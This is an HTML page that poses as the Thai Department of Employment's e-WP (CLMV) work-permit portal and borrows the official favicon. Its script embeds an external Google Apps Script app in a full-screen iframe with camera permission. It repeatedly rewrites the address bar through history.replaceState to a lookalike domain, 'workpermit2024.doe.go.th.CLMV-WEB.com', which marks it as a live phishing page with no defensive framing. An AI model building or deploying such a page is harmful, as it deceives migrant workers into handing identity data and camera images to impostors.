<!DOCTYPE html>
<html lang="th" style="margin: 0; padding: 0; height: 100%; overflow: hidden;">
<head>
    <base target="_top">
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Workpermit 2024</title>
    <meta name="apple-mobile-web-app-title" content="e-WP (CLMV)">
    <meta name="application-name" content="e-WP (CLMV)">
    <link rel="icon" type="image/x-icon" href="https://e-workpermit.doe.go.th/CLMV-WEB/img/logo_login.png">
    
    <style>
        body, html {
            margin: 0;
            padding: 0;
            height: 100%;
            overflow: hidden;
        }
        #myIframe {
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            border: none;
        }
    </style>
</head>
<body>
    <iframe id="myIframe" scrolling="yes" src="" allow="camera"></iframe>
    <script>
        let urlChanged = false; // ป้องกันการเปลี่ยน URL หลายครั้ง
        
        function getUrlParameter(name) {
            name = name.replace(/[\[]/, '\\[').replace(/[\]]/, '\\]');
            var regex = new RegExp('[\\?&]' + name + '=([^&#]*)');
            var results = regex.exec(location.search);
            return results === null ? '' : decodeURIComponent(results[1].replace(/\+/g, ' '));
        }
        
        // เปลี่ยน URL แสดงใน address bar
        function changeUrlDisplay() {
            if (urlChanged) return; // ถ้าเปลี่ยนแล้วก็ไม่ต้องเปลี่ยนอีก
            
            var currentParams = window.location.search;
            var newUrl = 'https://workpermit2024.doe.go.th.CLMV-WEB.com' + currentParams;
            
            // ตรวจสอบว่า URL ปัจจุบันไม่ใช่ URL ที่ต้องการแล้ว
            if (window.location.href === newUrl) {
                urlChanged = true;
                return;
            }
            
            console.log('Current URL:', window.location.href);
            console.log('Changing URL to:', newUrl);
            
            // เปลี่ยน URL โดยไม่ reload หน้า
            if (window.history && window.history.replaceState) {
                try {
                    window.history.replaceState({}, '', newUrl);
                    urlChanged = true;
                    console.log('URL changed successfully to:', window.location.href);
                    
                    // เปลี่ยน title ด้วย
                    document.title = 'e-WP (CLMV) - Work Permit System';
                } catch (e) {
                    console.error('Error changing URL:', e);
                }
            } else {
                console.log('History API not supported');
            }
        }
        
        // โหลด iframe
        var iframe = document.getElementById('myIframe');
        var baseUrl = 'https://script.google.com/macros/s/AKfycbyL_GmdRM1tTiz8ged8AN40n0IYq90Hgia3fcK53H-_8Z0bY_JHRxuM7c48E0MgCFH1/exec';
        var id = getUrlParameter('id');
        var iframeUrl = baseUrl;
        if (id) {
            iframeUrl += '?id=' + id;
        }
        iframe.src = iframeUrl;
        
        // เปลี่ยน URL ทันทีที่โหลดหน้า
        changeUrlDisplay();
        
        // เปลี่ยน URL หลังจาก DOM โหลดเสร็จ
        document.addEventListener('DOMContentLoaded', function() {
            console.log('DOM Content Loaded');
            changeUrlDisplay();
        });
        
        // เปลี่ยน URL หลังจากหน้าโหลดเสร็จทั้งหมด
        window.addEventListener('load', function() {
            console.log('Window Loaded');
            changeUrlDisplay();
        });
        
        // เปลี่ยน URL หลังจากโหลด iframe เสร็จ
        iframe.onload = function() {
            console.log('Iframe Loaded');
            changeUrlDisplay();
        };
        
        // เปลี่ยน URL ด้วย setTimeout หลายครั้ง
        setTimeout(function() {
            console.log('Timeout 100ms');
            changeUrlDisplay();
        }, 100);
        
        setTimeout(function() {
            console.log('Timeout 500ms');
            changeUrlDisplay();
        }, 500);
        
        setTimeout(function() {
            console.log('Timeout 1000ms');
            changeUrlDisplay();
        }, 1000);
        
        setTimeout(function() {
            console.log('Timeout 2000ms');
            changeUrlDisplay();
        }, 2000);
    </script>
</body>
</html>
